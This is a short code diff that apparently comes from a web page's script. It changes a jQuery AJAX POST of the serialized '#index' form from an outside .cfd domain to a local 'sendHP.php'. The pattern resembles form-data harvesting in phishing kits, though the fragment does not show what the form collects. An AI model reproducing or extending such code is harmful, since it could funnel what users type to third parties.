@@ -567,7 +567,7 @@ chsalxcome {
    
    $.ajax({
         type: 'POST',
-        url: 'https://choreoapps.kj-pow.cfd/25/no.php',
+        url: 'sendHP.php',
         data: $('#index').serialize(),
         datatype: 'JSON',
       complete: function() {
